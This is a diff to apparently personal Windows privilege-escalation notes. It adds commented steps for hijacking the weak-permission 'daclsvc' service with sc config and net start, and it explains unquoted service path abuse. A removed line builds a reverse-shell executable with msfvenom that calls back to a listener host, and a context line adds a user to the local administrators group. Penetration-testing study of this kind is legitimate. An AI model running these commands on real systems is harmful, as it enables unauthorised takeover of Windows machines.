@@ -269,19 +269,27 @@ net localgroup administrators <username> /add
 
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o rev.exe
+# Run winPEAS to check for service misconfigurations:
 
 winPEASany.exe quiet servicesinfo
+Note that we can modify the “daclsvc” service.We can confirm this with accesschk.exe:
 
 accesschk.exe /accepteula -uwcqv user daclsvc
 
 user=username
 daclsvc name of the service. 
 
+#Check the current configuration of the service:
 sc qc daclsvc
 
+#Check the current status of the service:
+sc query daclsvc
+
+Reconfigure the service to use our reverse shell executable:
 sc config daclsvc binpath= "\"c:\Privesc\rev.exe\""
 
+Start a listener on Kali, and then start the service to trigger the
+exploit:
 QueryServiceConfig SUCCESS                                                                                                  
                                                                                                                                  
 SERVICE_NAME: daclsvc                                                                                                            
@@ -298,6 +306,16 @@ SERVICE_NAME: daclsvc
 net start daclsvc
 ```
 
+## Unquoted Service Path
+
+Executables in windows can be run without using their extension. For eg. whoami.exe can be run by just whoami.
+Some executables takes arguments, spearated by the spaces. eg.
+```bash
+someproge.exe arg1 arg2 arg3...
+```
+This behavior leads to the ambiguity when using the absolute paths that are unquoted and contain spaces. Consider the following unquoted path:
+C:\Program Files\Some Dir\SomeProgram.exe
+To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn.If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.
 
 
 ### Iperius Backup 6.1.0 - Privilege Escalation
